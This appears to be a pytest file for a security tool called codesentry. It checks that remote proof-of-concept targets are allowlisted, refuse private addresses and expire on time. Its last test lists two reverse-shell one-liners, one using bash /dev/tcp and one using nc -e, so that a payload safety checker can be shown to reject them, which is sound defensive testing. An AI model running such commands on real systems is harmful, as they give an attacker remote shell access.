from datetime import UTC, datetime, timedelta
from types import SimpleNamespace

import pytest

from codesentry.control import poc_targets


@pytest.fixture(autouse=True)
def _enable(monkeypatch):
    monkeypatch.setenv("CODESENTRY_POC_REMOTE_ENABLED", "true")
    monkeypatch.setenv("CODESENTRY_POC_REMOTE_ALLOW_PRIVATE", "false")


def test_private_target_rejected():
    with pytest.raises(ValueError):
        poc_targets.validate_target_url("https://127.0.0.1", ["127.0.0.1"])


def test_host_must_match_allowlist():
    with pytest.raises(ValueError):
        poc_targets.validate_target_url("https://8.8.8.8", ["example.com"])


def test_create_probe_and_expiry(monkeypatch):
    monkeypatch.setattr(poc_targets.httpx, "get",
                        lambda *a, **k: SimpleNamespace(
                            status_code=200, headers={"content-type": "text/html"}))
    target = poc_targets.create_target(
        "authorized-demo", "https://8.8.8.8", ["8.8.8.8"],
        expires_at=datetime.now(UTC) + timedelta(days=1),
    )
    try:
        out = poc_targets.probe_target(target["id"])
        assert out["ok"] is True and out["status_code"] == 200
        # 过期后不可用
        from codesentry.db.pool import get_conn
        with get_conn() as conn, conn.cursor() as cur:
            cur.execute("UPDATE poc_targets SET expires_at=%s WHERE id=%s",
                        (datetime.now(UTC) - timedelta(seconds=1), target["id"]))
            conn.commit()
        with pytest.raises(ValueError):
            poc_targets.probe_target(target["id"])
    finally:
        poc_targets.delete_target(target["id"])


def test_disabled_remote_rejected(monkeypatch):
    monkeypatch.setenv("CODESENTRY_POC_REMOTE_ENABLED", "false")
    with pytest.raises(ValueError):
        poc_targets.validate_target_url("https://8.8.8.8", ["8.8.8.8"])


def test_reverse_shell_payload_still_rejected():
    from codesentry.agents.poc_gen import check_payload_safety

    for payload in ("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "nc 1.2.3.4 4444 -e /bin/sh"):
        ok, _ = check_payload_safety(payload)
        assert ok is False
